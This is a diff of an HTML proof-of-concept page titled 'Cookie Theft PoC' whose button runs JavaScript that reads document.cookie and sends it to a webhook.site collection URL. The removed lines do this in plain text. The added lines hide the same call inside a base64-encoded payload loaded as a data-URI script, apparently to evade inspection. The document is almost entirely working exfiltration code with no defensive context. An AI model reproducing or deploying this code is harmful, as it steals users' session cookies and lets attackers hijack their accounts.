@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>proof of concept</title>
+    <title>Cookie Theft PoC</title>
     <style>
         .test-button {
             display: block;
@@ -16,29 +16,19 @@
     </style>
 </head>
 <body>
-
-    <button class="test-button" onclick="triggerAttack()">Click me</button>
+    <h1>Cookie Theft PoC</h1>
+    <button class="test-button" onclick="triggerAttack()">Steal Cookies</button>
 
     <script>
         function triggerAttack() {
-            alert('I got ur Cookies!');
-          
-            var dataUri = 'data:text/javascript,' + encodeURIComponent(`
-                new Image().src = 'https://webhook.site/8cfff3aa-33a7-44d3-9de1-86fd29b0967b/steal?cookie=' + encodeURIComponent(document.cookie);
-            `);
-            var script = document.createElement('script');
-            script.src = dataUri;
-            document.body.appendChild(script);
+            // Base64 encoded JavaScript payload
+            var encodedPayload = 'bmV3IEltYWdlKCkuc3JjID0gJ2h0dHBzOi8vd2ViaG9vay5zaXRlLzhjZmZmM2FhLTMzYTctNDRkMy05ZGUxLTg2ZmQyOWIwOTY3Yi9yZWNlaXZlLWNvb2tpZXM/Y29va2llPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuY29va2llKTsK';
 
-            // Inline event handler
-            var div = document.createElement('div');
-            div.onclick = function() {
-                new Image().src = 'https://webhook.site/8cfff3aa-33a7-44d3-9de1-86fd29b0967b/steal?cookie=' + encodeURIComponent(document.cookie);
-            };
-            div.innerHTML = 'Click me to send cookies';
-            document.body.appendChild(div);
+            // Create a script element and set its source to the Base64 encoded payload
+            var script = document.createElement('script');
+            script.src = 'data:text/javascript;base64,' + encodedPayload;
+            document.body.appendChild(script);
         }
-         
     </script>
 </body>
 </html>
